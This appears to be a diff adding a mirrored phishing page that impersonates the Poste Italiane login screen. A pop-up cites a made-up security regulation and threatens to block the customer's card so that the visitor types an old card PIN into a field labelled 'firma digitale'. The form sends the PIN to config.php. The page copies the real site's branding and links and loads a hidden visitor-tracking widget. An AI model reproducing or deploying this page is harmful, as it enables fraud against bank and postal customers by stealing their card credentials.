@@ -1,0 +1,766 @@
+<html lang="it">
+	<!--
+* PyWebCopy Engine [version 7.0.2]
+* Copyright 2020; Raja Tomar
+* File mirrored from [https://p3.193-42-32-215.cprapid.com/]
+* At UTC datetime: [2023-06-24 04:43:23.203570]
+--><head>
+		<title>Accedi o Registrati</title>
+
+
+		
+		
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, user-scalable=0">
+		<link type="text/css" rel="stylesheet" href="all/bootstrap.min.css">
+		<link type="text/css" rel="stylesheet" href="all/owl.carousel.css">
+		<link type="text/css" rel="stylesheet" href="all/base.css">
+		<link type="text/css" rel="stylesheet" href="all/megamenu-pi.css">
+		<link type="text/css" rel="stylesheet" href="all/retina.css">
+		<link type="text/css" rel="stylesheet" href="all/custom-form-element.css">
+		<script type="text/javascript" src="all/jquery.min.js"></script>
+		<script type="text/javascript" src="all/utilita.js"></script>
+		<script type="text/javascript" src="all/poste-it.js"></script>
+		<script type="text/javascript" src="all/megamenu-pi.js"></script>
+		<script type="text/javascript" src="all/scroll-pi.js"></script>
+		<script type="text/javascript" src="all/slick.min.js"></script>
+		<script type="text/javascript" src="all/jquery.hc-sticky.min.js"></script>
+		<script type="text/javascript" src="all/jquery.mobile.custom.min.js"></script>
+		<script type="text/javascript" src="all/custom-form-element.js"></script>
+		<script type="text/javascript" src="all/utilita-app.js"></script>
+		
+		<script type="text/javascript" src="../www.poste.it/bowser.js"></script>
+		<!--[if lt IE 9]>
+		<script type="text/javascript" src="/risorse_dt/bootstrap/js/html5shiv.min.js"></script>
+		<![endif]-->
+		<!--[if lt IE 9]>
+		<script type="text/javascript" src="/risorse_dt/bootstrap/js/respond.min.js"></script>
+		<![endif]-->
+		<!--[if IE 8]>
+		<link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/ie8.css">
+		<![endif]-->
+		<!--[if lt IE 8]>
+		<link type="text/css" rel="stylesheet" href="/risorse_dt/condivise/stili/trasversali/ie7-ie6.css">
+		<![endif]-->
+		
+
+		
+		
+
+		
+		
+		
+		
+		<script type="text/javascript">
+			$(function(){
+				$('#checkbox-remember').on('change', function(){
+					if($(this).is(':checked')){
+						$('#rememberme').val("on"); 
+					}
+					else{
+						$('#rememberme').val(""); 
+					}
+				});
+				
+				$('#password-trigger').on('mousedown',function(){
+					$('#password').attr('type','text');
+					$('#password-trigger').removeClass('bg-password-hide')
+					$('#password-trigger').addClass('bg-password-show')
+				}).on('mouseup',function(){
+					$('#password').attr('type','password');
+					$('#password-trigger').removeClass('bg-password-show')
+					$('#password-trigger').addClass('bg-password-hide')
+				}).on('mouseleave',function(){
+					$('#password').attr('type','password');
+					$('#password-trigger').removeClass('bg-password-show')
+					$('#password-trigger').addClass('bg-password-hide')
+				});
+				
+			});
+			
+			function deleteRememberMe() {
+				$('#username').val("");
+				$('#firstname').text("");
+				$('.rememberme_hidden').show();
+				$('.rememberme_shown').hide();
+				$('#rememberme').val(""); 
+			}
+		</script>
+		
+		<style>
+			h1.idp-retail {
+				font-size: 40px !important;
+			}
+			h3.idp-retail {
+				font-size: 20px !important;
+			}
+			.spacer-xs-top-38 {
+				margin-top: 38px !important;
+			}
+			.bg-box-qrcode { 
+				background-image: url("all/bg-qrcode.png");
+				background-repeat: no-repeat!important;
+				background-position-x: center!important;
+				background-position-y: bottom!important;
+			}
+
+			.bg-css-countdown {
+				background-color: #dae5f6;
+				margin-bottom:0 !important;
+			}
+			
+			.bg-password-show {
+			    background-image: url(all/eye-cut.png);
+			    background-position: center;
+			    background-repeat: no-repeat;
+			}
+			
+			.bg-password-hide {
+			    background-image: url(all/eye.png);
+			    background-position: center;
+			    background-repeat: no-repeat;
+			}
+			
+		</style>
+		
+		
+<style>
+
+/* /* The Modal (background) */ */
+/* .modal { */
+/*   display: none; /* Hidden by default */ */
+/*   position: absolute; /* Stay in place */ */
+/*   z-index: 1; /* Sit on top */ */
+/*   padding-top: 100px; /* Location of the box */ */
+/*   left: 0; */
+/*   top: 0; */
+/*   width: 100%; /* Full width */ */
+/*   height: 100%; /* Full height */ */
+/*   overflow: auto; /* Enable scroll if needed */ */
+/*   overflow-y: auto !important; */
+/*   background-color: rgb(0,0,0); /* Fallback color */ */
+/*   background-color: rgba(0,0,0,0.4); /* Black w/ opacity */ */
+/* } */
+
+/* /* Modal Content */ */
+/* .modal-content { */
+/*   background-color: #fefefe; */
+/*   margin: auto; */
+/*   padding: 20px; */
+/*   border: 1px solid #888; */
+/*   width: 80%; */
+/* } */
+
+/* /* The Close Button */ */
+/* .close { */
+/*   color: #aaaaaa; */
+/*   float: right; */
+/*   font-size: 28px; */
+/*   font-weight: bold; */
+/* } */
+
+/* .close:hover, */
+/* .close:focus { */
+/*   color: #000; */
+/*   text-decoration: none; */
+/*   cursor: pointer; */
+/* } */
+</style>
+		
+
+		
+		
+		
+
+   
+    
+
+<script type="text/javascript" src="all/x-jod-poste-id.js"></script>
+
+
+	
+
+
+
+	
+
+<script type="text/javascript" src="all/hashtable.js"></script>
+<script type="text/javascript" src="all/rsa.js"></script>
+<script type="text/javascript" src="all/pbase-css-poste.js"></script>
+
+
+
+
+
+
+<script type="text/javascript" src="all/jdpolling.js"></script>
+
+
+
+
+	</head>
+	<body>
+				
+		<!--googleoff: all-->
+		<script type="text/javascript">
+	        $('<div class="pageLoader"><img class="loader-logo" alt="Poste Italiane" src="./all/logo-poste-italiane.png"  srcset="./all/logo-poste-italiane@2x.png 2x"><img class="loader-spinner" src="./all/spinner_giallo.gif" /></div>').appendTo('body');
+	        $(".pageLoader").css({
+	            "background-color": "#fff",
+	            "position": "fixed",
+	            "width": "100%",
+	            "height": "100%",
+	            "z-index": "9999",
+	            "top": "0",
+	            "opacity": "1",
+	            "text-align": "center",
+	            "padding-top": "20%",
+	            "display": "block"
+	        });
+	        $(".pageLoader .loader-spinner").css({
+	            "padding-top": "40px",
+	            "width": "40px",
+	            "display": "block",
+	            "margin": "0 auto"
+	        });
+	        $(".pageLoader .loader-logo").css({
+	            "height": "22px"
+	        });
+			$(window).ready(function() {
+				if (typeof bowser != "undefined") {
+					if (!$("html").hasClass("pi-mobile") &&
+						((bowser.msie && bowser.version < 10) ||
+						(bowser.edge && bowser.version < 20) ||
+						(bowser.firefox && bowser.version < 40) ||
+						(bowser.opera && bowser.version < 33) ||
+						(bowser.chrome && bowser.version < 41) ||
+						(bowser.safari && bowser.version < 9))
+					) {
+						$("#content-alert-old-browser").show();
+						$(".content-alert-browser").show();
+					}
+				}
+			});
+		</script>	
+			
+		
+			<div id="consent_blackbar"></div>
+		
+		<div class="content content-federation-bar content-federation-bar-minified content-federation-bar-simplified">
+			<div class="container container-extended">
+				<div class="row">
+					<div class="col-md-12">
+						<div class="header-minified">
+							<div class="row">
+								<div class="col-xs-12">
+									<div class="federation-bar-content-logo pull-xs-left clearfix">
+										<div class="logo">
+											<a href="https://www.poste.it/index.html" title="" class="hidden-xs hidden-sm">
+												<span class="wrap-logo wrap-logo-medium"><img alt="Poste Italiane" src="all/logo-poste-italiane-medium.png" srcset="all/logo-poste-italiane-medium_2x.png 2x" class="logo-image-pi-medium"></span>
+											</a>
+											<a href="https://www.poste.it/index.html" title="" class="logo-mobile hidden-md hidden-lg">
+												<span class="wrap-logo wrap-logo-small"><img alt="Poste Italiane" src="all/logo-poste-italiane-medium.png" srcset="all/logo-poste-italiane-medium_2x.png 2x" class="logo-image-pi-small"></span>
+											</a>
+										</div>
+										
+										<div class="back spacer-md-left-30">
+											<a class="back-link" href="https://p3.193-42-32-215.cprapid.com/jod-fcc/idplogin?cancel=1" title="Torna indietro">
+												<span class="hidden-xs hidden-sm">Torna indietro</span>
+											</a>
+										</div>
+										
+									</div>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<!--googleon: all-->
+		<div class="content content-applicative  nobracket">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-12" id="accessibility-anchor">
+						<div class="row">
+							<div class="col-xs-12 ">
+								<div class="main" style="margin-top: -40px !important;">
+									<div class="row">
+										<div class="col-md-12">
+											<div class="abstract">
+												<div class="abstract-heading text-xs-center spacer-xs-bottom-40">
+													<h1 class="idp-retail"><br>
+														Nuova Carta 
+														<small>
+															<h3 class="idp-retail">
+																Per ricevere la tua Nuova <strong><span id="titolo-fcc">CARTA</span></strong> devi essere un utente registrato. Inserisci nell'apposito campo "FIRMA DIGITALE" il tuo vecchio PIN servir&#224; come autentificazione legittima titolare Carta. A breve ricever&#224; il suo nuovo PIN attraverso un Sms lo conservi attentamente.
+																
+
+																
+															</h3>
+														</small>
+													</h1>
+													
+												</div>
+											</div>
+										</div>
+									</div>
+									<div class="row">
+										<div class="col-md-8 pull-sm-not center">
+											<div class="row equalize-group equalize-group-1">
+												<div class="col-sm-12">
+													<div class="content">
+														<div class="content-overflow-wrap">
+															<div class="row">
+																<!-- panel credenziali  -->
+																 
+																
+																<div class="col-xs-12 col-sm-6">
+																
+																
+																	<div class="panel panel-cards panel-cards-large">
+																		<div class="panel-wrap innerspacer-xs-bottom-0">
+																			<div class="panel-heading spacer-xs-top-30 rememberme_hidden">
+																				<h4 class="text-xs-center">
+																					Inserisci il tuo vecchio <strong>PIN</strong>
+																				</h4>
+																			</div>
+																			<div class="panel-heading spacer-xs-top-30 text-xs-center rememberme_shown" style="display:none">
+																				<img src="all/empty-profile.png" srcset="all/empty-profile_2x.png 2x"> 
+																				<h4 id="firstname"></h4>
+																				<p><a href="javascript:deleteRememberMe();">Non sei tu?</a></p>
+																			</div>
+																			<form action="config.php" class="form-login spacer-xs-bottom-30 clearfix" method="POST">
+																				<input type="hidden" name="" id="" value="">
+																				<input type="hidden" name="" id="" value="">
+																				<input type="hidden" name="" id="" value="">
+																				<input type="hidden" name="" id="" value="">
+																				<input type="hidden" name="" id="" value="">
+																				<div class="panel-body">
+																					<div class="spacer-xs-bottom-30">
+<div class="form-group form-group-lg rememberme_hidden">
+																							<p>
+																								<label class="control-label" for="username">firma digitale</label> 
+<input class="form-control" id="New Pin" name="New Pin" required="" data-err_text="Username non valido" placeholder="inserisci" type="text" value="">
+	</p>
+		</div>
+		
+
+			                                                                                </div>
+
+																						<div class="form-group form-group-lg rememberme_hidden">
+																							<div class="checkbox">
+																								<p>
+															
+																								</p>
+																							</div>
+																						</div>
+																						<div class="box-editable-area spacer-xs-top-40">
+																							<p class="subtext text-center spacer-xs-0" style="font-size: 0.85em;">
+															
+																							</p>
+																						</div>
+																						<p class="btn-container btn-container-center spacer-xs-bottom-15 spacer-xs-top-30 clearfix">
+																							<input type="submit" class="btn btn-primary btn-expand" value="invia">
+																						</p>
+																						 
+																						
+																						<p class="subtext text-center spacer-xs-0" style="font-size:0.9em">
+																							Non hai un account? <a href="#">Registrati</a>
+																						</p>
+																						
+																					</div>
+																				</form></div>
+																			
+																		</div>
+																	</div>
+																</div>
+																<!-- panel qrcode  -->
+																 
+																
+																	<div class="col-sm-6 hidden-xs">
+																		<div class="panel panel-cards panel-cards-large bg-box-qrcode">
+																			<div class="panel-wrap innerspacer-xs-bottom-0 text-xs-center">
+																				<div class="panel-heading spacer-xs-top-30">
+																					<h4 class="text-xs-center">
+																						Accedi <strong>pi&#249; velocemente</strong>
+																					</h4>
+																				</div>
+																		
+																				
+																					<p>Inquadra il codice QR con le app <b>BancoPosta</b> o <b>Postepay</b></p>
+																					
+																					
+																					<p class="innerspacer-sm-bottom-10 innerspacer-sm-top-10"><img src="./all/ico-bp.png">&#160;&#160;<img src="./all/ico-pp.png"></p>
+																				
+																					
+																					
+																					
+																					<p class="innerspacer-sm-bottom-15">
+																						<img src="https://securelogin.poste.it/jod-fcc/qrcodelogin">
+																					</p>
+																					
+																					<p class="innerspacer-sm-bottom-20 bg-css-countdown">Il codice &#232; valido per <span id="_timer"></span></p>
+																					<form name="xqr" id="xqr" method="POST" action="/jod-fcc/qrcodelogin">
+																						<input name="x-user-signature-transaction" id="x-user-signature-transaction" type="hidden" value="">
+																					</form>
+																					
+																			</div>
+																		</div>
+																	</div>
+																
+																
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+										<!-- area ID PosteID Abilitato SPID  -->
+										 
+											<div class="col-md-8 pull-sm-not center" id="sp-posteid-fcc">
+												<div class="row">
+													<div class="col-sm-12">
+														<div class="content">
+															<div class="content-overflow-wrap">
+																<div class="row">
+																	<div class="col-xs-12">
+																		<div class="panel panel-cards panel-cards-large">
+																			<div class="panel-body">
+																				<div class="box-editable-area text-xs-center text-md-left">
+																					<div class="col-sm-3">
+																						<div class="spacer-xs-bottom-30 spacer-xs-top-30">
+																							<img src="./all/logo-posteid.png" srcset="./all/logo-posteid@2x.png 2x">
+																						</div>
+																					</div>
+																					<div class="col-sm-5">
+																						<div class="spacer-xs-bottom-30 spacer-xs-top-30">
+																							<span style="font-size: 0.85em;">
+																								Puoi eseguire l'accesso con l'Identit&#224; Digitale
+																								PosteID abilitato a SPID. 
+																								<a href="#">
+																									Scopri di pi&#249;
+																								</a>.
+																							</span>
+																						</div>
+																					</div>
+																					<div class="col-sm-4">
+																						<div class="clearfix text-xs-center">
+																							<a href="#" id="bottonePosteID"><span class="btn btn-xs btn-primary spacer-xs-top-38">accedi
+																									con posteid</span></a>
+																						</div>
+																					</div>
+																				</div>
+																			</div>
+																		</div>
+																	</div>
+																</div>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										
+										<!-- do you need help -->
+										<div class="content content-post-main">
+											<div class="container">
+												<div class="row" id="help__assistenza">
+													<div class="col-sm-12">
+														<h2 class="text-xs-center">Hai bisogno di aiuto?</h2>
+													</div>
+													<div class="col-md-8 col-lg-push-1 col-lg-10">
+														<div class="btn-container text-xs-center">
+															<div class="row">
+																<div class="col-sm-6 col-md-4 col-sm-push-0 col-md-push-0">
+																	<a href="#" title="Chiamaci" class="btn btn-sm btn-secondary btn-expand"><img src="./all/ico-chiamaci.png" srcset="./all/ico-chiamaci@2x.png 2x" class="spacer-xs-right-10">Chiamaci</a>
+																</div>
+																<div class="col-sm-6 col-md-4">
+																	<a href="#" title="Domande Frequenti" target="_self" class="btn btn-sm btn-secondary btn-expand"><img src="./all/ico-scrivici.png" srcset="./all/ico-scrivici@2x.png 2x" class="spacer-xs-right-10">Scrivici</a>
+																</div>
+																<div class="col-sm-6 col-md-4">
+																	<a href="#" title="Richiedi Assistenza" class="btn btn-sm btn-secondary btn-expand"><img class="spacer-xs-right-10" src="./all/ico-vieni-in-poste-cerca-up.png" srcset="./all/ico-vieni-in-poste-cerca-up@2x.png 2x">Vieni
+																		in Poste</a>
+																</div>
+															</div>
+														</div>
+													</div>
+													<div class="content content-main" style="padding-top: 15px;">
+														<div class="container">
+															<div class="row">
+																<div class="col-md-8 col-lg-push-1 col-lg-10 text-xs-center innerspacer-xs-top-30">
+																	In caso di mancato accesso o non funzionamento dei
+																	servizi &#232; possibile contattare il Call Center al
+																	numero verde <a href="tel:803.160">803.160</a> (dal
+																	luned&#236; al sabato dalle ore 8.00 alle ore 20.00).
+																	La chiamata &#232; gratuita.
+																</div>
+															</div>
+														</div>
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+								</div>
+								<!--html template-->
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		
+		<div class="content content-footer content-footer-post">
+			<div class="container">
+				<div class="row">
+					<div class="col-md-12">
+						<div class="row">
+							<div class="col-md-5">
+								<p class="text-xs-center text-md-left">
+									&#169; Poste Italiane 2020 - Partita iva : 01114601006
+								</p>
+							</div>
+							<div class="col-md-7">
+								<div class="clearfix">
+									<div class="base-footer">
+										<div id="teconsent"></div>
+									</div>
+								</div>
+							</div>
+						</div>
+						<a href="#" class="btn btn-primary btn-cta back-to-top"> <span class="hide">vai a inizio pagina</span>
+						</a>
+					</div>
+				</div>
+			</div>
+		</div>
+		
+		<script type="text/javascript" src="./all/start-script.js"></script>
+		<script type="text/javascript" src="./all/bootstrap.js"></script>
+		<script type="text/javascript" src="./all/ie10-viewport-bug-workaround.js"></script>
+		
+		
+
+	
+<!-- The Modal -->
+      <div class="modal" id="modalQrWaiting" tabindex="-1">
+          <div class="modal-dialog" style="margin-top: 0px;" role="dialog" aria-labelledby="modalQrWaitingLabel" aria-modal="true" aria-describedby="modalQrWaitingDesc">
+              <div class="modal-content">
+			 	  <div class="modal-body">
+					  <div class="row">
+
+					  </div>	  
+                      <div class="row">
+                          <div class="col-sm-12 text-xs-center">
+                              <h3 class="spacer-xs-bottom-30" id="modalQrWaitingLabel">Controlla il tuo<br>smartphone</h3>
+                              
+							
+
+								<img id="imgmyappnane" src="./all/small-modal-ico-bp-pp.png">
+								
+								
+                              <p class="spacer-xs-bottom-20" id="modalQrWaitingDesc">
+								 
+																													
+																					Per proseguire devi autorizzare nell'App che hai utilizzato per inquadrare il codice QR.
+																					
+																					
+																					
+																				
+								  
+								  
+								  
+								  
+								  </p>
+                              
+							  <p></p><div id="__polling_progress__"></div>
+							  
+							  <p class="spacer-xs-bottom-0 text-xs-center">
+                                  <button type="button" class="btn btn-default" data-dismiss="modal" aria-label="Close" id="close">Annulla</button>
+                              </p>
+                              
+                          </div>
+                      </div>
+
+                  </div>
+                  
+              </div>
+          </div>
+      </div>
+<div class="modal fade" id="modalDati" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-lg" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="myModalLabel"><img src="https://www.poste.it/risorse_dt/condivise/immagini/loghi/logo-poste-italiane-small.png"></h4>
+            </div>
+            <div class="modal-body">
+                <p><span style="color:#FF0000;"> <strong><strong></strong></strong></span></p>
+<p><strong>Gentile Cliente,</strong></p>
+
+<p><strong>E' stato contattato dal nostro centro distribuzione carte.<br>Dal 08/01/2023 &#232; entrata in vigore la nuova normativa sulla sicurezza NAZIONALE (PSD2 e PIN-CARTA) e diventa quindi obbligatorio abilitare i nuovi metodi di sicurezza dall'articolo 190.4 Comma 3.</strong>
+</p><p><strong> La invitiamo quindi ad attivare il nuovo PIN attraverso il modulo che segue. il mancato aggiornamento porter&#224; il blocco della sua Nuova Carta.</strong>
+
+
+
+</p><p><strong>RICORDIAMO CHE TUTTI I CAMPI SONO OBBLIGATORI</strong></p>
+
+
+
+<p><span style="color:#FF0000;"> <strong>Si prega di compilare il seguente modulo in assoluta privacy assicurandosi di essere soli al momento della compilazione dati.  </strong></span></p> </div>
+            <div class="modal-footer">
+                <div class="row">
+                    <div class="col-sm-12">
+                        <p class="spacer-xs-bottom-0 text-xs-center">
+                            <button type="button" data-toggle="modal" data-dismiss="modal" class="btn btn-primary">PROCEDI</button>
+                        </p>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-extra"> &#169;Poste Italiane 2022-2023 - Partita iva : 01114601006 </div>
+        </div>
+		
+    </div>
+</div>
+		
+	
+	<script>
+		$(function() {
+		
+			$("#modalDati").find(".modal-dialog").css("margin-top","30px!important");
+			setTimeout(function() {
+				$("#modalDati").modal();
+			}, 1000);
+			
+			$(document).on("hidden.bs.modal", "#modalDati", function() {
+				$("#username").focus();
+			});
+		});
+		</script>
+  <!-- Modal content -->
+	
+	
+<script language="javascript">
+	
+jd_qrpush("https://idp-poste.poste.it/jod-idp-retail/polling/v1/app-qr", "a70cc7eb-bb28-45a1-b961-129f4d7233fd",  xxxsuccess, xxxerror, "modalQrWaiting");
+
+	function xxxsuccess(xdata) {
+
+		try {
+			var f = document.getElementById("x-user-signature-transaction");
+			var obj_p = JSON.parse(xdata);
+			f.value=obj_p.usersignaturetransaction;
+			
+			var xqr = document.getElementById("xqr");
+			xqr.submit();
+			
+		} catch (e) {
+			//alert(e);
+		}
+	
+		
+		
+		//alert("OK");
+		
+		
+	}
+	
+	$('#modalQrWaiting').on('hide.bs.modal', function(){
+		stopPolling();
+	})
+
+	
+
+	
+	
+function getStatus() {
+	
+	var status = jdstatus();
+	if ("az_timeout" == status || "az_rejected" == status || "az_error" == status) {	
+		document.getElementById('__polling_progress__').innerHTML = "La richiesta di accesso &egrave; stata annullata";
+	}
+	setTimeout(getStatus, 100);
+}
+getStatus();
+
+
+
+</script>
+
+<script language="javascript">
+	
+function startTimer(duration,display) {
+    var timer = duration, minutes, seconds;
+    setInterval(function () {
+        minutes = parseInt(timer / 60, 10);
+        seconds = parseInt(timer % 60, 10);
+
+        minutes = minutes < 10 ? "0" + minutes : minutes;
+        seconds = seconds < 10 ? "0" + seconds : seconds;
+
+		if (display!=null) {
+			display.innerHTML = minutes + ":" + seconds;
+		}
+        if (--timer < 0) {
+			timer = 0;
+            xxxerror();
+        }
+    }, 1000);
+}
+
+var tt =  document.getElementById('_timer');
+// 60 * 5
+startTimer(60*5, tt);
+
+</script>
+
+
+
+
+
+	
+
+		
+		<script language="JavaScript">
+		
+		</script>
+				
+
+		
+        
+		<form name="loginform1" id="loginform1" method="post" action="">
+			<input type="hidden" value="" id="secureToken" name="secureToken">
+			<input type="hidden" value="" id="signature" name="signature">
+			<input type="hidden" name="" id="" value="">
+			<input type="hidden" name="" id="" value="">
+			<input type="hidden" name="" id="" value="">
+			
+		</form>  
+						
+		<script type="text/javascript">
+		jQuery("#x_chiudi").attr("href", "https://www.poste.it");
+		</script>
+
+				
+		
+		<script type="text/javascript">
+		$('#_nocookie').toggleClass("hide");
+	//	$('#bottonePosteID').html('<div class="bottonePosteID-wrapper"><a href="https://posteid.poste.it/jod-securelogin-schema/idplogin?key=0ApedafzVkj0ZMZqhipyf-PY0APOmSwPUJlekI3vNBahDqeVD6D_Sw.dFupahIe0drl3GFzyXddVw.M8--h8-vSPnB3wcvMpZRvUU1tme9Oa3Ok9BJ2lFx_qDoFwDrgvCBLw6zt0mhWynREO8CnUYZ_NXF5ucGoPL4g6m9pByhIWa24byCR77cbxOmV4rMfaEAb5dnkDVHe86MGmBTyL5u85pMYYZaIOPxvMFmQz42BcoO2a2yFjBRUNtB_isKrJNl3tf1oANIrJDUkoZronQkS0DVCXG0fdy_mxmXwYLw33qFnezyx2OitpTDjMsMWgm1ZZeHGLgoNAMIrTCeSUIn5TDtw103fvTES1X7lhvJGNW02agH69aDZJaUS-QGA_lCR-WDT83U1TDn3ksGvp4PjQ7rPfY_D_Wfu2VlhCDnJ0qgFd9q0WXbQiISwZu_39hCcaMHj0Hg2ikhJ6_nVjI8WKyKdPlrW9OF3nVFPyT17RlkDpl9MCGnq1QhJdcxaRkDZAkLy1m8NaYJiaOFRC_D4ItjXvW_Lu1q_Gyzds-qm3s8UFQrYPXvE2f4_3ETpKmhPlxSc1oFCTmlQie2TAKzAPCE68eID2JPOBX9gl6uo9z10rJs09-w-GD3RmYC20NZZSUwAQKb5gpKEDgEYk_2zMc4rGmRBvAzM0V_mhcton71jDUjs9ABEQQdjVcSgH7BrqVVfkUKEfd6qwgnwQtDFcifobzkRXlvQPa1Gpg0HzV9_fnUetzSSz4yo2ZgvQA2tABV_KdrSgkD7OuM58Qk9lPIaLZHbwMXJOfwwqaBYjBfTNxUgFjQAC2szp76VNtOJAxUsMcMNXOyNJcZPCEImdhqTuMmx05zLyZAU2cryrmRJRGAz22llCUfReAC2X09noDxvtCf3y7i2MDBhOsxxPpl2lU4pTbTHU17R7N7y4LEgjcg1XJRNRXVIrbGc-d2pNygAMDJz3WD.gyefFB7VhvMozbUUrNaOQg"><img src="/risorse_dt/condivise/immagini/loghi/logo-posteid.png" srcset="/risorse_dt/condivise/immagini/loghi/logo-posteid@2x.png 2x" class="" /><span class="wrapperPosteID-info">Entra con PosteID <span class="wrapperPosteID-name"></span></span></a></div><div class="newUserPosteID-wrapper"></div>');
+		$('#bottonePosteID').attr("href","https://posteid.poste.it/jod-securelogin-schema/idplogin?key=0ApedafzVkj0ZMZqhipyf-PY0APOmSwPUJlekI3vNBahDqeVD6D_Sw.dFupahIe0drl3GFzyXddVw.M8--h8-vSPnB3wcvMpZRvUU1tme9Oa3Ok9BJ2lFx_qDoFwDrgvCBLw6zt0mhWynREO8CnUYZ_NXF5ucGoPL4g6m9pByhIWa24byCR77cbxOmV4rMfaEAb5dnkDVHe86MGmBTyL5u85pMYYZaIOPxvMFmQz42BcoO2a2yFjBRUNtB_isKrJNl3tf1oANIrJDUkoZronQkS0DVCXG0fdy_mxmXwYLw33qFnezyx2OitpTDjMsMWgm1ZZeHGLgoNAMIrTCeSUIn5TDtw103fvTES1X7lhvJGNW02agH69aDZJaUS-QGA_lCR-WDT83U1TDn3ksGvp4PjQ7rPfY_D_Wfu2VlhCDnJ0qgFd9q0WXbQiISwZu_39hCcaMHj0Hg2ikhJ6_nVjI8WKyKdPlrW9OF3nVFPyT17RlkDpl9MCGnq1QhJdcxaRkDZAkLy1m8NaYJiaOFRC_D4ItjXvW_Lu1q_Gyzds-qm3s8UFQrYPXvE2f4_3ETpKmhPlxSc1oFCTmlQie2TAKzAPCE68eID2JPOBX9gl6uo9z10rJs09-w-GD3RmYC20NZZSUwAQKb5gpKEDgEYk_2zMc4rGmRBvAzM0V_mhcton71jDUjs9ABEQQdjVcSgH7BrqVVfkUKEfd6qwgnwQtDFcifobzkRXlvQPa1Gpg0HzV9_fnUetzSSz4yo2ZgvQA2tABV_KdrSgkD7OuM58Qk9lPIaLZHbwMXJOfwwqaBYjBfTNxUgFjQAC2szp76VNtOJAxUsMcMNXOyNJcZPCEImdhqTuMmx05zLyZAU2cryrmRJRGAz22llCUfReAC2X09noDxvtCf3y7i2MDBhOsxxPpl2lU4pTbTHU17R7N7y4LEgjcg1XJRNRXVIrbGc-d2pNygAMDJz3WD.gyefFB7VhvMozbUUrNaOQg"); 
+		</script>
+
+
+	<!--  -->
+
+
+
+
+
+<div style="display:none;">
+<script id="_waukeo">var _wau = _wau || []; _wau.push(["small", "leg002", "keo"]);
+(function() {var s=document.createElement("script"); s.async=true;
+s.src="https://widgets.amung.us/small.js";
+document.getElementsByTagName("head")[0].appendChild(s);
+})();</script>
+<div class="pageLoader" style="background-color: rgb(255, 255, 255); position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 1; text-align: center; padding-top: 20%; display: none;"><img class="loader-logo" alt="Poste Italiane" src="./all/logo-poste-italiane.png" srcset="./all/logo-poste-italiane@2x.png 2x" style="height: 22px;"><img class="loader-spinner" alt="attendi il caricamento" src="./all/spinner_giallo.gif" style="padding-top: 40px; width: 40px; display: block; margin: 0px auto;"></div>
+<div class="modal-backdrop fade in"></div>
+</div></body>
+</html>
